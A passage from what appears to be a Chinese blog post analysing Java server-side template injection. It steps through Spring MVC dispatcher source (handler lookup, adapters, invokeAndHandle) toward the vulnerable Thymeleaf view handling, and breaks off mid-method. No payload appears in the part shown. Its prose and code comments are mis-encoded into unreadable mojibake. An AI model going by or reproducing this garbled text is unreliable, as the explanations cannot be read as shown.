¹æ® request è·å– handler</span><br>    <span class="hljs-type">Object</span> <span class="hljs-variable">handler</span> <span class="hljs-operator">=</span> getHandlerInternal(request);<br>    <span class="hljs-keyword">if</span> (handler == <span class="hljs-literal">null</span>) &#123;<br>        <span class="hljs-comment">// å¦‚æœæ²¡æœ‰æ‰¾åˆ°å°±ä½¿ç”¨é»˜è®¤çš„ handler</span><br>        handler = getDefaultHandler();<br>    &#125;<br>    <span class="hljs-keyword">if</span> (handler == <span class="hljs-literal">null</span>) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>    &#125;<br>    <span class="hljs-comment">// å¦‚æœ Handler æ˜¯ Stringï¼Œè¡¨æ˜æ˜¯ä¸€ä¸ª bean åç§°ï¼Œéœ€è¦å¯»æ‰¾å¯¹åº” bean</span><br>    <span class="hljs-keyword">if</span> (handler <span class="hljs-keyword">instanceof</span> String) &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">handlerName</span> <span class="hljs-operator">=</span> (String) handler;<br>        handler = obtainApplicationContext().getBean(handlerName);<br>    &#125;<br>    <span class="hljs-comment">// å°è£… Handler æ‰§è¡Œé“¾</span><br>    <span class="hljs-keyword">return</span> getHandlerExecutionChain(handler, request);<br>&#125;<br></code></pre></td></tr></table></figure><p>AbstractHandlerMapping ç±»ä¸­çš„ getHandler æ–¹æ³•ä¸­é¦–å…ˆ<strong>æ ¹æ® request è·å– handler</strong>ï¼Œçœ‹åˆ°è°ƒç”¨äº†æ–°çš„<strong>getHandlerInternal</strong> æ–¹æ³•</p><p><img src="/img/ssti(java)/ssti37.png"></p><p>è·Ÿè¿›ä¸€ä¸‹AbstractHandlerMethodMapping ç±»ä¸­çš„ <strong>getHandlerInternal</strong> æ–¹æ³•ï¼Œçœ‹åˆ°è¯¥æ–¹æ³•é¦–å…ˆè·å– request ä¸­çš„ urlï¼Œå³ <code>/path</code>ï¼Œç”¨æ¥åŒ¹é… handler å¹¶å°è£…æˆ HandlerMethodï¼Œç„¶åæ ¹æ® handlerMethod ä¸­çš„ bean æ¥å®ä¾‹åŒ– Handler å¹¶è¿”å›ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">protected</span> HandlerMethod <span class="hljs-title function_">getHandlerInternal</span><span class="hljs-params">(HttpServletRequest request)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>    <span class="hljs-comment">// è·å– request ä¸­çš„ urlï¼Œç”¨æ¥åŒ¹é… handler</span><br>    <span class="hljs-type">String</span> <span class="hljs-variable">lookupPath</span> <span class="hljs-operator">=</span> getUrlPathHelper().getLookupPathForRequest(request);<br>    request.setAttribute(LOOKUP_PATH, lookupPath);<br>    <span class="hljs-built_in">this</span>.mappingRegistry.acquireReadLock();<br>    <span class="hljs-keyword">try</span> &#123;<br>        <span class="hljs-comment">// æ ¹æ®è·¯å¾„å¯»æ‰¾ Handlerï¼Œå¹¶å°è£…æˆ HandlerMethod</span><br>        <span class="hljs-type">HandlerMethod</span> <span class="hljs-variable">handlerMethod</span> <span class="hljs-operator">=</span> lookupHandlerMethod(lookupPath, request);<br>        <span class="hljs-comment">// æ ¹æ® handlerMethod ä¸­çš„ bean æ¥å®ä¾‹åŒ– Handlerï¼Œå¹¶æ·»åŠ è¿› HandlerMethod</span><br>        <span class="hljs-keyword">return</span> (handlerMethod != <span class="hljs-literal">null</span> ? handlerMethod.createWithResolvedBean() : <span class="hljs-literal">null</span>);<br>    &#125;<br>    <span class="hljs-keyword">finally</span> &#123;<br>        <span class="hljs-built_in">this</span>.mappingRegistry.releaseReadLock();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°ä»requestä¸­è·å–äº†&#x2F;path</p><p><img src="/img/ssti(java)/ssti38.png"></p><p>æ¥ä¸‹æ¥ï¼Œæˆ‘ä»¬çœ‹ <strong>lookupHandlerMethod</strong> çš„é€»è¾‘ï¼Œä¸»è¦é€»è¾‘å§”æ‰˜ç»™äº† <strong>mappingRegistry</strong> è¿™ä¸ªæˆå‘˜å˜é‡æ¥å¤„ç†ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">protected</span> HandlerMethod <span class="hljs-title function_">lookupHandlerMethod</span><span class="hljs-params">(String lookupPath, HttpServletRequest request)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>    List&lt;Match&gt; matches = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>&lt;&gt;();<br>    <span class="hljs-comment">// é€šè¿‡ lookupPath å±æ€§ä¸­æŸ¥æ‰¾ã€‚å¦‚æœæ‰¾åˆ°äº†ï¼Œå°±è¿”å›å¯¹åº”çš„RequestMappingInfo</span><br>    List&lt;T&gt; directPathMatches = <span class="hljs-built_in">this</span>.mappingRegistry.getMappingsByUrl(lookupPath);<br>    <span class="hljs-keyword">if</span> (directPathMatches != <span class="hljs-literal">null</span>) &#123;<br>        <span class="hljs-comment">// å¦‚æœåŒ¹é…åˆ°äº†ï¼Œæ£€æŸ¥å…¶ä»–å±æ€§æ˜¯å¦ç¬¦åˆè¦æ±‚ï¼Œå¦‚è¯·æ±‚æ–¹æ³•ï¼Œå‚æ•°ï¼Œheader ç­‰</span><br>        addMatchingMappings(directPathMatches, matches, request);<br>    &#125;<br>    <span class="hljs-keyword">if</span> (matches.isEmpty()) &#123;<br>        <span class="hljs-comment">// æ²¡æœ‰ç›´æ¥åŒ¹é…åˆ°ï¼Œåˆ™éå†æ‰€æœ‰çš„å¤„ç†æ–¹æ³•è¿›è¡Œé€šé…ç¬¦åŒ¹é…</span><br>        addMatchingMappings(<span class="hljs-built_in">this</span>.mappingRegistry.getMappings().keySet(), matches, request);<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> (!matches.isEmpty()) &#123;<br>        <span class="hljs-comment">// å¦‚æœæ–¹æ³•æœ‰å¤šä¸ªåŒ¹é…ï¼Œä¸åŒçš„é€šé…ç¬¦ç­‰ï¼Œåˆ™æ’åºé€‰æ‹©å‡ºæœ€åˆé€‚çš„ä¸€ä¸ª</span><br>        Comparator&lt;Match&gt; comparator = <span class="hljs-keyword">new</span> <span class="hljs-title class_">MatchComparator</span>(getMappingComparator(request));<br>        matches.sort(comparator);<br>        <span class="hljs-type">Match</span> <span class="hljs-variable">bestMatch</span> <span class="hljs-operator">=</span> matches.get(<span class="hljs-number">0</span>);<br>        <span class="hljs-comment">// å¦‚æœæœ‰å¤šä¸ªåŒ¹é…çš„ï¼Œä¼šæ‰¾åˆ°ç¬¬äºŒä¸ªæœ€åˆé€‚çš„è¿›è¡Œæ¯”è¾ƒ</span><br>        <span class="hljs-keyword">if</span> (matches.size() &gt; <span class="hljs-number">1</span>) &#123;<br>            <span class="hljs-keyword">if</span> (logger.isTraceEnabled()) &#123;<br>                logger.trace(matches.size() + <span class="hljs-string">&quot; matching mappings: &quot;</span> + matches);<br>            &#125;<br>            <span class="hljs-keyword">if</span> (CorsUtils.isPreFlightRequest(request)) &#123;<br>                <span class="hljs-keyword">return</span> PREFLIGHT_AMBIGUOUS_MATCH;<br>            &#125;<br>            <span class="hljs-type">Match</span> <span class="hljs-variable">secondBestMatch</span> <span class="hljs-operator">=</span> matches.get(<span class="hljs-number">1</span>);<br>            <span class="hljs-keyword">if</span> (comparator.compare(bestMatch, secondBestMatch) == <span class="hljs-number">0</span>) &#123;<br>                <span class="hljs-type">Method</span> <span class="hljs-variable">m1</span> <span class="hljs-operator">=</span> bestMatch.handlerMethod.getMethod();<br>                <span class="hljs-type">Method</span> <span class="hljs-variable">m2</span> <span class="hljs-operator">=</span> secondBestMatch.handlerMethod.getMethod();<br>                <span class="hljs-type">String</span> <span class="hljs-variable">uri</span> <span class="hljs-operator">=</span> request.getRequestURI();<br>                <span class="hljs-comment">// ä¸èƒ½æœ‰ç›¸åŒçš„æœ€ä¼˜ Match</span><br>                <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">IllegalStateException</span>(<br>                        <span class="hljs-string">&quot;Ambiguous handler methods mapped for &#x27;&quot;</span> + uri + <span class="hljs-string">&quot;&#x27;: &#123;&quot;</span> + m1 + <span class="hljs-string">&quot;, &quot;</span> + m2 + <span class="hljs-string">&quot;&#125;&quot;</span>);<br>            &#125;<br>        &#125;<br>        request.setAttribute(BEST_MATCHING_HANDLER_ATTRIBUTE, bestMatch.handlerMethod);<br>        <span class="hljs-comment">// è®¾ç½® request å‚æ•°ï¼ˆRequestMappingHandlerMapping å¯¹å…¶è¿›è¡Œäº†è¦†å†™ï¼‰</span><br>        handleMatch(bestMatch.mapping, lookupPath, request);<br>        <span class="hljs-comment">// è¿”å›åŒ¹é…çš„ url çš„å¤„ç†çš„æ–¹æ³•</span><br>        <span class="hljs-keyword">return</span> bestMatch.handlerMethod;<br>    &#125;<br>    <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-comment">// è°ƒç”¨ RequestMappingHandlerMapping ç±»çš„ handleNoMatch æ–¹æ³•å†åŒ¹é…ä¸€æ¬¡</span><br>        <span class="hljs-keyword">return</span> handleNoMatch(<span class="hljs-built_in">this</span>.mappingRegistry.getMappings().keySet(), lookupPath, request);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>ä¹‹åé€šè¿‡createWithResolvedBean()æ–¹æ³•ï¼Œæ ¹æ® handlerMethod ä¸­çš„ bean æ¥å®ä¾‹åŒ– Handler(æ‰¾åˆ°å¯¹åº”æ§åˆ¶å™¨)</p><p>é€šè¿‡ä¸Šé¢çš„è¿‡ç¨‹ï¼Œæˆ‘ä»¬å°±è·å–åˆ°äº† Handlerã€‚</p><p>çœ‹åˆ°åŠ¨æ€è°ƒè¯•æ—¶å›åˆ°AbstractHandlerMapping ç±»ä¸­çš„ getHandler æ–¹æ³•ç»§ç»­æ‰§è¡Œï¼Œè°ƒç”¨äº†getHandlerExecutionChainæ–¹æ³•</p><p><img src="/img/ssti(java)/ssti39.png"></p><p>è¯¥æ–¹æ³•æ˜¯ç”¨äº<strong>å°è£…æ‰§è¡Œé“¾</strong>ï¼Œå°†é…ç½®çš„æ‹¦æˆªå™¨åŠ å…¥åˆ°æ‰§è¡Œé“¾ä¸­å»ï¼Œ<strong>getHandlerExecutionChain</strong> æ–¹æ³•å¦‚ä¸‹ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">protected</span> HandlerExecutionChain <span class="hljs-title function_">getHandlerExecutionChain</span><span class="hljs-params">(Object handler, HttpServletRequest request)</span> &#123;<br>    <span class="hljs-comment">// å¦‚æœå½“å‰ Handler ä¸æ˜¯æ‰§è¡Œé“¾ç±»å‹ï¼Œå°±ä½¿ç”¨ä¸€ä¸ªæ–°çš„æ‰§è¡Œé“¾å®ä¾‹å°è£…èµ·æ¥</span><br>    <span class="hljs-type">HandlerExecutionChain</span> <span class="hljs-variable">chain</span> <span class="hljs-operator">=</span> (handler <span class="hljs-keyword">instanceof</span> HandlerExecutionChain ? (HandlerExecutionChain) handler : <span class="hljs-keyword">new</span> <span class="hljs-title class_">HandlerExecutionChain</span>(handler));<br><br>    <span class="hljs-type">String</span> <span class="hljs-variable">lookupPath</span> <span class="hljs-operator">=</span> <span class="hljs-built_in">this</span>.urlPathHelper.getLookupPathForRequest(request, LOOKUP_PATH);<br>    <span class="hljs-comment">// éå†æ‹¦æˆªå™¨ï¼Œæ‰¾åˆ°è·Ÿå½“å‰ url å¯¹åº”çš„ï¼Œæ·»åŠ è¿›æ‰§è¡Œé“¾ä¸­å»</span><br>    <span class="hljs-keyword">for</span> (HandlerInterceptor interceptor : <span class="hljs-built_in">this</span>.adaptedInterceptors) &#123;<br>        <span class="hljs-keyword">if</span> (interceptor <span class="hljs-keyword">instanceof</span> MappedInterceptor) &#123;<br>            <span class="hljs-type">MappedInterceptor</span> <span class="hljs-variable">mappedInterceptor</span> <span class="hljs-operator">=</span> (MappedInterceptor) interceptor;<br>            <span class="hljs-keyword">if</span> (mappedInterceptor.matches(lookupPath, <span class="hljs-built_in">this</span>.pathMatcher)) &#123;<br>                chain.addInterceptor(mappedInterceptor.getInterceptor());<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">else</span> &#123;<br>            chain.addInterceptor(interceptor);<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> chain;<br>&#125;<br></code></pre></td></tr></table></figure><p>åˆ°æ­¤ä¸ºæ­¢ï¼Œæˆ‘ä»¬å°±è·å–äº†å½“å‰è¯·æ±‚çš„ Handler æ‰§è¡Œé“¾ï¼Œæ¥ä¸‹æ¥çœ‹ä¸‹æ˜¯å¦‚ä½•è·å–è¯·æ±‚çš„ <strong>Handler é€‚é…å™¨</strong>ï¼Œä¸»è¦ä¾é  <strong>DispatcherServlet ç±»çš„ getHandlerAdapter æ–¹æ³•</strong>ï¼Œè¯¥æ–¹æ³•å°±æ˜¯éå†æ‰€æœ‰çš„ HandlerAdapterï¼Œæ‰¾åˆ°å’Œå½“å‰ Handler åŒ¹é…çš„å°±è¿”å›ï¼Œåœ¨è¿™é‡ŒåŒ¹é…åˆ°çš„ä¸º RequestMappingHandlerAdapterã€‚DispatcherServlet ç±»çš„ getHandlerAdapter æ–¹æ³•å¦‚ä¸‹</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">protected</span> HandlerAdapter <span class="hljs-title function_">getHandlerAdapter</span><span class="hljs-params">(Object handler)</span> <span class="hljs-keyword">throws</span> ServletException &#123;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">this</span>.handlerAdapters != <span class="hljs-literal">null</span>) &#123;<br>        <span class="hljs-comment">// éå†æ‰€æœ‰çš„ HandlerAdapterï¼Œæ‰¾åˆ°å’Œå½“å‰ Handler åŒ¹é…çš„å°±è¿”å›</span><br>        <span class="hljs-keyword">for</span> (HandlerAdapter adapter : <span class="hljs-built_in">this</span>.handlerAdapters) &#123;<br>            <span class="hljs-keyword">if</span> (adapter.supports(handler)) &#123;<br>                <span class="hljs-keyword">return</span> adapter;<br>            &#125;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ServletException</span>(<span class="hljs-string">&quot;No adapter for handler [&quot;</span> + handler +<br>            <span class="hljs-string">&quot;]: The DispatcherServlet configuration needs to include a HandlerAdapter that supports this handler&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="HandlerAdapter-æ‰§è¡Œå½“å‰çš„-Handler"><a href="#HandlerAdapter-æ‰§è¡Œå½“å‰çš„-Handler" class="headerlink" title="HandlerAdapter æ‰§è¡Œå½“å‰çš„ Handler"></a>HandlerAdapter æ‰§è¡Œå½“å‰çš„ Handler</h4><p>å†è·å–å®Œå½“å‰è¯·æ±‚çš„ Handler é€‚é…å™¨åï¼Œæ¥ç€è¿›è¡Œ<strong>ç¼“å­˜å¤„ç†</strong>ï¼Œä¹Ÿå°±æ˜¯å¯¹ last-modified çš„å¤„ç†ï¼Œç„¶åè°ƒç”¨ applyPreHandle æ–¹æ³•<strong>æ‰§è¡Œæ‹¦æˆªå™¨çš„ preHandle æ–¹æ³•</strong>ï¼Œå³éå†æ‰€æœ‰å®šä¹‰çš„ interceptorï¼Œæ‰§è¡Œ postHandle æ–¹æ³•ï¼Œç„¶åå°±åˆ°äº†å®é™…æ‰§è¡Œ handle çš„åœ°æ–¹ï¼ŒdoDispatch æ–¹æ³•ä¸­ handle æ–¹æ³•æ˜¯æ‰§è¡Œå½“å‰ Handlerï¼Œæˆ‘ä»¬è¿™é‡Œä½¿ç”¨çš„æ˜¯ RequestMappingHandlerAdapterï¼Œé¦–å…ˆä¼šè¿›å…¥ <strong>AbstractHandlerMethodAdapter çš„ handle æ–¹æ³•</strong>ï¼š</p><p>å®ç°æ‰§è¡Œ Controller ä¸­ (Handler) çš„æ–¹æ³•,è¿”å› ModelAndView è§†å›¾</p><p><img src="/img/ssti(java)/ssti40.png"></p><p>åœ¨ AbstractHandlerMethodAdapter çš„ handle æ–¹æ³•ä¸­åˆè°ƒç”¨äº† <strong>RequestMappingHandlerAdapter ç±»çš„ handleInternal æ–¹æ³•</strong>ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">protected</span> ModelAndView <span class="hljs-title function_">handleInternal</span><span class="hljs-params">(HttpServletRequest request, HttpServletResponse response, HandlerMethod handlerMethod)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>    ModelAndView mav;<br>    checkRequest(request);<br>    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">this</span>.synchronizeOnSession) &#123;<br>        <span class="hljs-type">HttpSession</span> <span class="hljs-variable">session</span> <span class="hljs-operator">=</span> request.getSession(<span class="hljs-literal">false</span>);<br>        <span class="hljs-keyword">if</span> (session != <span class="hljs-literal">null</span>) &#123;<br>            <span class="hljs-type">Object</span> <span class="hljs-variable">mutex</span> <span class="hljs-operator">=</span> WebUtils.getSessionMutex(session);<br>            <span class="hljs-keyword">synchronized</span> (mutex) &#123;<br>                mav = invokeHandlerMethod(request, response, handlerMethod);<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">else</span> &#123;<br>            mav = invokeHandlerMethod(request, response, handlerMethod);<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-comment">// æ‰§è¡Œæ–¹æ³•ï¼Œå°è£… ModelAndView</span><br>        mav = invokeHandlerMethod(request, response, handlerMethod);<br>    &#125;<br>    <span class="hljs-keyword">if</span> (!response.containsHeader(HEADER_CACHE_CONTROL)) &#123;<br>        <span class="hljs-keyword">if</span> (getSessionAttributesHandler(handlerMethod).hasSessionAttributes()) &#123;<br>            applyCacheSeconds(response, <span class="hljs-built_in">this</span>.cacheSecondsForSessionAttributeHandlers);<br>        &#125;<br>        <span class="hljs-keyword">else</span> &#123;<br>            prepareResponse(response);<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> mav;<br>&#125;<br></code></pre></td></tr></table></figure><p>åœ¨æ‰§è¡Œå®Œ handle æ–¹æ³•åï¼Œç„¶åè°ƒç”¨ applyDefaultViewName æ–¹æ³•<strong>ç»„è£…é»˜è®¤è§†å›¾åç§°</strong>ï¼Œå°†å‰ç¼€å’Œåç¼€åéƒ½åŠ ä¸Šï¼Œæ¥ç€è°ƒç”¨ applyPostHandle æ–¹æ³•<strong>æ‰§è¡Œæ‹¦æˆªå™¨çš„ preHandle æ–¹æ³•</strong>ï¼Œä¹Ÿå°±æ˜¯éå†æ‰€æœ‰å®šä¹‰çš„ interceptorï¼Œæ‰§è¡Œ postHandle æ–¹æ³•</p><h4 id="å°è£…ModelAndViewå¯¹è±¡"><a href="#å°è£…ModelAndViewå¯¹è±¡" class="headerlink" title="å°è£…ModelAndViewå¯¹è±¡"></a>å°è£…ModelAndViewå¯¹è±¡</h4><p><code>invokeHandlerMethod()</code> æ–¹æ³•å…ˆæ‰§è¡Œç›®æ ‡çš„ <code>HandlerMethod</code>ï¼Œå¹¶è¿”å›ä¸€ä¸ª <code>ModelAndView</code> å¯¹è±¡ã€‚æ¯”è¾ƒé‡è¦çš„æ–¹æ³•åœ¨ç¬¬ 512 è¡Œï¼Œæ­¤å¤„çš„ handlerMethod å…¶å®æ˜¯ <code>com.abc.ssti.controller.ThymeleafController#path(String)</code>ï¼Œè¿™ä¸€ä¸ªæ–¹æ³•ï¼Œé€šè¿‡ <code>this.createInvocableHandlerMethod()</code> æ–¹æ³•ï¼Œå°†å…¶å°è£…æˆ <code>ServletInvocableHandlerMethod</code> ç±»ï¼Œå¹¶è®©å…¶å…·æœ‰ invoke æ‰§è¡Œèƒ½åŠ›ã€‚</p><p><img src="/img/ssti(java)/ssti41.png"></p><p>åç»­ï¼Œç»™ <code>invocableMethod</code> çš„å„å¤§å±æ€§èµ‹å€¼ï¼Œåœ¨èµ‹å€¼å®Œæ¯•å new äº†ä¸€ä¸ª <code>ModelAndViewContainer</code> å¯¹è±¡ï¼Œåç»­ä¼šå°†æ‰€æœ‰çš„å€¼ä¿å­˜åˆ°è¿™ä¸€ä¸ªå¯¹è±¡ä¸­ã€‚</p><p><img src="/img/ssti(java)/ssti42.png"></p><p>å¾€ä¸‹èµ°ï¼Œå…ˆè°ƒç”¨ <code>AsyncWebRequest</code> è¿›è¡Œå¼‚æ­¥è¯·æ±‚çš„åŒ…è£…ï¼Œåç»­é’ˆå¯¹æ˜¯å¦æ˜¯å¼‚æ­¥è¯·æ±‚ï¼Œåšä¸åŒçš„å¤„ç†ã€‚ç»§ç»­å¾€ä¸‹èµ°ï¼Œåˆ° 524è¡Œçš„åœ°æ–¹æ˜¯å…³é”®ç‚¹ï¼Œå®ƒè°ƒç”¨äº† <code>ServletInvocableHandlerMethod.invokeAndHandle()</code> æ–¹æ³•ï¼Œè°ƒç”¨è¿™ä¸ªæ–¹æ³•çš„ä½œç”¨ä¸»è¦æ˜¯è·å–åˆ°äº† returnValueHandlersï¼Œè·Ÿè¿›çœ‹ä¸€ä¸‹ã€‚</p><p><img src="/img/ssti(java)/ssti43.png"></p><p>åœ¨<code>ServletInvocableHandlerMethod#invokeAndHandle</code>ä¸­ï¼Œåšäº†å¦‚ä¸‹æ“ä½œï¼š</p><ul><li><code>invokeForRequest</code>è°ƒç”¨Controlleråè·å–è¿”å›å€¼åˆ°<code>returnValue</code>ä¸­</li><li>åˆ¤æ–­<code>returnValue</code>æ˜¯å¦ä¸ºç©ºï¼Œå¦‚æœæ˜¯åˆ™ç»§ç»­åˆ¤æ–­<code>0RequestHandled</code>æ˜¯å¦ä¸º<code>True</code>ï¼Œéƒ½æ»¡è¶³çš„è¯è®¾ç½®<code>requestHandled</code>ä¸º<code>true</code></li><li>é€šè¿‡<code>handleReturnValue</code>æ ¹æ®è¿”å›å€¼çš„ç±»å‹å’Œè¿”å›å€¼å°†ä¸åŒçš„å±æ€§è®¾ç½®åˆ°<code>ModelAndViewContainer</code>ä¸­ã€‚</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">invokeAndHandle</span><span class="hljs-params">(ServletWebRequest webRequest, ModelAndViewContainer mavContainer, Object... providedArgs)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-comment">//è°ƒç”¨Controlleråè·å–è¿”å›å€¼åˆ°returnValueä¸­</span><br>        <span class="hljs-type">Object</span> <span class="hljs-variable">returnValue</span> <span class="hljs-operator">=</span> <span class="hljs-built_in">this</span>.invokeForRequest(webRequest, mavContainer, providedArgs);<br>        <span class="hljs-built_in">this</span>.setResponseStatus(webRequest);<br>        <span class="hljs-comment">//åˆ¤æ–­returnValueæ˜¯å¦ä¸ºç©º</span><br>        <span class="hljs-keyword">if</span> (returnValue == <span class="hljs-literal">null</span>) &#123;<br>            <span class="hljs-comment">//åˆ¤æ–­RequestHandledæ˜¯å¦ä¸ºTrue</span><br>            <span class="hljs-keyword">if</span> (<span class="hljs-built_in">this</span>.isRequestNotModified(webRequest) || <span class="hljs-built_in">this</span>.getResponseStatus() != <span class="hljs-literal">null</span> || mavContainer.isRequestHandled()) &#123;<br>                <span class="hljs-built_in">this</span>.disableContentCachingIfNecessary(webRequest);<br>                <span class="hljs-comment">//è®¾ç½®RequestHandledå±æ€§</span><br>                mavContainer.setRequestHandled(<span class="hljs-literal">true</span>);<br>                <span class="hljs-keyword">return</span>;<br>            &#125;<br>        &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (StringUtils.hasText(<span class="hljs-built_in">this</span>.getResponseStatusReason())) &#123;<br>            mavContainer.setRequestHandled(<span class="hljs-literal">true</span>);<br>            <span class="hljs-keyword">return</span>;<br>        &#125;<br>        mavContainer.setRequestHandled(<span class="hljs-literal">false</span>);<br>        Assert.state(<span class="hljs-built_in">this</span>.returnValueHandlers != <span class="hljs-literal">null</span>, <span class="hljs-string">&quot;No return value handlers&quot;</span>);<br>        <span class="hljs-keyword">try</span> &#123;<br>        <span class="hljs-comment">//é€šè¿‡handleReturnValueæ ¹æ®è¿”å›å€¼çš„ç±»å‹å’Œè¿”å›å€¼å°†ä¸åŒçš„å±æ€§è®¾ç½®åˆ°ModelAndViewContainerä¸­ã€‚</span><br>            <span class="hljs-built_in">this</span>.returnValueHandlers.handleReturnValue(returnValue, <span class="hljs-built_in">this</span>.getReturnValueType(returnValue), mavContainer, webRequest);<br>        &#125; <span class="hljs-keyword">catch</span> (Exception var6) &#123;<br>            <span class="hljs-keyword">if</span> (logger.isTraceEnabled()) &#123;<br>                logger.trace(<span class="hljs-built_in">this</span>.formatErrorForReturnValue(returnValue), var6);<br>            &#125;<br>            <span class="hljs-keyword">throw</span> var6;<br>       <br></code></pre></td></tr></table></figure><p>ä¸‹é¢åˆ†æ<code>handleReturnValue</code>æ–¹æ³•ã€‚</p><ul><li><code>selectHandler</code>æ ¹æ®è¿”å›å€¼å’Œç±»å‹æ‰¾åˆ°ä¸åŒçš„<code>HandlerMethodReturnValueHandler</code>ï¼Œè¿™é‡Œå¾—åˆ°äº†<code>ViewNameMethodReturnValueHandler</code>,å…·ä½“æ€ä¹ˆå¾—åˆ°çš„å°±ä¸åˆ†æäº†ã€‚</li><li>è°ƒç”¨<code>handler.handleReturnValue</code>ï¼Œè¿™é‡Œå¾—åˆ°ä¸åŒçš„<code>HandlerMethodReturnValueHandler</code>å¤„ç†çš„æ–¹å¼ä¹Ÿä¸ç›¸åŒã€‚</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">handleReturnValue</span><span class="hljs-params">(<span class="hljs-meta">@Nullable</span> Object returnValue, MethodParameter returnType, ModelAndViewContainer mavContainer, NativeWebRequest webRequest)</span> <span class="hljs-keyword">throws</span> 